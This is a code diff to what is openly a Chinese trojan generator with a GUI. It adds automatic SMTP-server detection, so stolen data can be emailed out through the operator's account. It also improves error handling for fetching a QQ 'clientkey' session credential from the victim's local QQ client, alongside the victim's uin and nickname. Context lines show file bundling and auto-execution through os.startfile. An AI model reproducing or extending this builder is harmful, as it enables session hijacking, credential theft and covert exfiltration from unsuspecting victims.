@@ -14,6 +14,8 @@ import zipfile
 from time import sleep
 import sys
 import base64
+import dns.resolver
+import traceback
 
 def encrypt(fpath: str, algorithm: str) -> str:
     with open(fpath, 'rb') as f:
@@ -120,7 +122,7 @@ class Ui_Dialog(object):
         self.lineEdit_3.setGeometry(QtCore.QRect(130, 42, 131, 20))
         self.lineEdit_3.setObjectName("lineEdit_3")
         self.pushButton = QtWidgets.QPushButton(Dialog)
-        self.pushButton.setGeometry(QtCore.QRect(40, 170, 221, 31))
+        self.pushButton.setGeometry(QtCore.QRect(40, 170, 226, 31))
         self.pushButton.setObjectName("pushButton")
         self.pushButton.clicked.connect(lambda: (self.textEdit.setText(""), Thread(
             target=self.generate_trojan).start()) if not self.func_running else QtWidgets.QMessageBox.critical(Dialog,
@@ -234,6 +236,7 @@ class Ui_Dialog(object):
         QtCore.QMetaObject.connectSlotsByName(Dialog)
         self.output_signal = EmittingStream()
         self.output_signal.textWritten.connect(self.change_textedit)
+        self.textEdit.setText("Tips: 木马生成如果不知道smtp服务器可留空,将自动获取")
 
     def retranslateUi(self, Dialog):
         _translate = QtCore.QCoreApplication.translate
@@ -266,6 +269,46 @@ class Ui_Dialog(object):
         self.checkBox_3.setText(_translate("Dialog", "捆绑文件"))
     def change_textedit(self, message: str):
         self.textEdit.setText(self.textEdit.toPlainText() + message)
+
+    def find_smtp_server(self,email_address):
+        data = {
+            "163.com": "smtp.163.com",
+            "126.com": "smtp.126.com",
+            "qq.com": "smtp.qq.com",
+            "outlook.com": "smtp-mail.outlook.com",
+            "gmail.com": "smtp.gmail.com",
+            "hotmail.com": "smtp.live.com",
+            "yahoo.com": "smtp.mail.yahoo.com",
+            "live.com": "smtp.live.com",
+            "foxmail.com": "smtp.foxmail.com",
+            "sina.com": "smtp.sina.com",
+            "sohu.com": "smtp.sohu.com",
+            "139.com": "smtp.139.com",
+            "189.com": "smtp.189.com",
+            "21cn.com": "smtp.21cn.com",
+            "aliyun.com": "smtp.aliyun.com",
+            "263.net": "smtp.263.net",
+            "yeah.net": "smtp.yeah.net",
+            "netease.com": "smtp.163.com",
+        }
+        url = email_address.split("@")[-1][:-1]
+        smtp_server = data.get(url)
+        if not smtp_server:
+            try:
+                answer = dns.resolver.resolve(url, "MX", raise_on_no_answer=False)
+                smtp_server = list(answer)[-1].exchange.to_text()
+                if "netease" in smtp_server:
+                    smtp_server = "smtp.qiye.163.com"
+                elif "mxhichina" in smtp_server:
+                    smtp_server = "smtp.mxhichina.com"
+                elif "qq" in smtp_server:
+                    smtp_server = "smtp.exmail.qq.com"
+                else:
+                    smtp_server = None
+            except Exception as e:
+                print(repr(e))
+                smtp_server = None
+        return f'"{smtp_server}"' if smtp_server else None
 
     def if_icon_checkbox_changed(self):
         if self.checkBox_2.isChecked():
@@ -354,11 +397,24 @@ class Ui_Dialog(object):
             clientkey_cookies = requests.utils.dict_from_cookiejar(clientkey_get.cookies)
             clientkey = clientkey_cookies.get("clientkey")
             if not clientkey:
-                print("[Warning]未获取到clientkey,请尝试稍后重启工具获取!")
+                print(f"""******************信息整理******************
+[Warning]未获取到clientkey,说明您的QQ还未生成clientkey,请尝试稍等30~60秒后重启工具获取!
+uin={uin}
+nickname={nickname}
+******************感谢使用******************""")
             else:
                 print(f"[+] clientkey={clientkey}")
+        except requests.exceptions.ConnectionError as e:
+            if "10054" in e.__str__(): # 10054则代表远程主机强迫关闭了一个现有的连接,即不支持(对应版本9.7.2x)
+                print(f"[ERROR] 连接失败,请检查您的QQ版本是否为9.7.2x/4301端口是否被占用,若是则说明无法使用!")
+            elif "10061" in e.__str__(): # 10061则代表端口未开放
+                print(f"[ERROR] 连接失败,请检查是否开启QQ!")
+            else:
+                print(f"[ERROR] 连接失败,原因:\n{e}")
+            self.func_running = False
+            return
         except Exception as e:
-            print(f"[ERROR] 获取clientkey发生错误,请检查是否开启QQ!")
+            print(f"[ERROR] 获取clientkey发生错误,原因:\n{traceback.format_exc()}{'-'*32}\n请尝试在主界面提交反馈至作者!")
             self.func_running = False
             return
         try:
@@ -505,11 +561,24 @@ class Ui_Dialog(object):
             if reset_icon_path or os.path.isfile(self.icon_path):
                 print("检测到图标文件不存在,将使用默认图标!")
                 self.icon_path = ''
-            print("环境已准备完毕,请输入信息!")
+            print("环境已准备完毕!")
             smtp_server = f'"{self.lineEdit.text()}"'
             smtp_port = self.lineEdit_2.text()
             smtp_account = f'"{self.lineEdit_3.text()}"'
             smtp_password = f'"{self.lineEdit_4.text()}"'
+            if smtp_account == '""' or smtp_password == '""':
+                print("请输入账号信息!")
+                self.func_running = False
+                return
+            if smtp_server == '""':
+                print("检测到smtp服务器为空,开始智能选择...")
+                smtp_server = self.find_smtp_server(smtp_account)
+                if not smtp_server:
+                    print("选择失败,可能是未支持的邮箱,请手动输入smtp服务器!")
+                    self.func_running = False
+                    return
+                print("选择成功!当前smtp服务器为:"+smtp_server[1:-1])
+                self.lineEdit.setText(smtp_server[1:-1])
             zip_path = '.\\Tools.zip'
             # 文件存储路径
             if not os.path.isdir('data'):
@@ -576,7 +645,7 @@ os.startfile(file)\n""" + content
             return
         except Exception as e:
             print("打包失败,发生致命错误!")
-            print("原因:"+repr(e))
+            print("原因:\n"+traceback.format_exc())
         self.func_running = False
         sys.stdout = sys.__stdout__
 
